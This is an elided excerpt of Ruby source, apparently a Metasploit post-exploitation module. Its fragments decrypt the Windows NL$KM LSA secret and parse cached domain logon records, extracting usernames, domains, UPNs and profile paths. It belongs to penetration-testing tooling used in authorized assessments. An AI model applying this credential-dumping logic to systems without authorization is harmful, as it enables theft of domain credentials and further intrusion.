...
class MetasploitModule < Msf::Post
  ...
  def capture_nlkm(lsakey)
    ...
    nlkm_dec = if lsa_vista_style?
                 decrypt_lsa_data(nlkm, lsakey)
               else
                 nlkm_dec = if sysinfo['Architecture'] == ARCH_X64
                              decrypt_secret_data(nlkm[0x10..-1], lsakey)
                            else # 32 bits
                              decrypt_secret_data(nlkm[0xC..-1], lsakey)
                            end
               end
  ...
  def parse_decrypted_cache(dec_data, s)
    ...
    username = dec_data[i, s.userNameLength].split("\x00\x00").first.delete("\x00")
    i += s.userNameLength
    ...
    if s.dnsDomainNameLength != 0
      dnsDomainName = dec_data[i, s.dnsDomainNameLength + 1].split("\x00\x00").first.delete("\x00")
    ...
    if s.upnLength != 0
      upn = dec_data[i, s.upnLength + 1].split("\x00\x00").first.delete("\x00")
      i += s.upnLength
      i += 2 * ((s.upnLength / 2) % 2)
      vprint_good "UPN\t\t\t: #{upn}"
    end
    ...
    if s.effectiveNameLength != 0
      effectiveName = dec_data[i, s.effectiveNameLength + 1].split("\x00\x00").first.delete("\x00")
    ...
    if s.fullNameLength != 0
      fullName = dec_data[i, s.fullNameLength + 1].split("\x00\x00").first.delete("\x00")
      i += s.fullNameLength
    ...
    if s.logonScriptLength != 0
      logonScript = dec_data[i, s.logonScriptLength + 1].split("\x00\x00").first.delete("\x00")
    ...
    if s.profilePathLength != 0
      profilePath = dec_data[i, s.profilePathLength + 1].split("\x00\x00").first.delete("\x00")
    ...
    if s.homeDirectoryLength != 0
      homeDirectory = dec_data[i, s.homeDirectoryLength + 1].split("\x00\x00").first.delete("\x00")
    ...
    if s.homeDirectoryDriveLength != 0
      homeDirectoryDrive = dec_data[i, s.homeDirectoryDriveLength + 1].split("\x00\x00").first.delete("\x00")
    ...
    if s.logonDomainNameLength != 0
      logonDomainName = dec_data[i, s.logonDomainNameLength + 1].split("\x00\x00").first.delete("\x00")
  ...
  def run
    ...
    begin
      ...
      join_status &= 0x00000000ffffffff if sysinfo['Architecture'] =~ /x64/
      ...
      ok.enum_value.each do |usr|
        ...
        dec_data = if lsa_vista_style?
                     decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
                   else
                     decrypt_hash(cache.enc_data, nlkm, cache.ch)
                   end
